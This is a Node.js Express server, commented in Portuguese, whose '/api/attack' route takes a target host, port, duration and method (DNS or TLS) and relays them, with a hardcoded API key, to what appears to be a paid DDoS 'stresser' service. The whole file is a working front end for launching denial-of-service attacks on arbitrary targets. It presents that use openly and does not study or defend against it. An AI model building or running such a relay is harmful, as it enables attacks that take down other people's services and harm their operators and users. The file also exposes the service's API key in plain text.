const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const port = 3001;

// Configurar CORS para permitir todas as origens
app.use(cors());

// Servir arquivos estáticos (HTML, CSS, JS) da pasta 'public'
app.use(express.static(path.join(__dirname, 'public')));

// Chave e URL da API do VAC
const vacApiKey = '009dfb7f-ab33-4d5b-9d72-da49232151cf';
const vacApiURL = 'https://api.vacstresser.ru/api';

// Mapeamento dos métodos entre as duas APIs
const methodMapping = {
    'DNS': { vacMethod: ["DNS"] },
    'TLS': { vacMethod: ["TLS"] },
    // Adicione outros métodos conforme necessário
};

// Rota para receber solicitações de ataque
app.get('/api/attack', async (req, res) => {
    const { host, port, time, method } = req.query;

    if (!host || !port || !time || !method) {
        return res.status(400).json({ error: 'Por favor, forneça todos os parâmetros necessários: host, port, time, method' });
    }

    // Verifica se o método existe no mapeamento
    if (!methodMapping[method]) {
        return res.status(400).json({ error: 'Método inválido' });
    }

    try {
        const { vacMethod } = methodMapping[method];

        // Array para armazenar as respostas da VAC
        const vacResponses = [];

        // Envia uma solicitação para cada método no array vacMethod
        for (const vacMethodItem of vacMethod) {
            const vacResponse = await axios.get(`${vacApiURL}?key=${vacApiKey}&host=${host}&port=${port}&time=${time}&method=${vacMethodItem}`);
            vacResponses.push(vacResponse.data);
        }

        res.json({ vacResponses: vacResponses });
    } catch (error) {
        console.error('Ocorreu um erro:', error);
        res.status(500).json({ error: 'Ocorreu um erro ao processar a solicitação' });
    }
});

// Servir o index.html para a rota raiz
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// Iniciar o servidor
app.listen(port, () => {
    console.log(`Servidor rodando em http://localhost:${port}`);
});
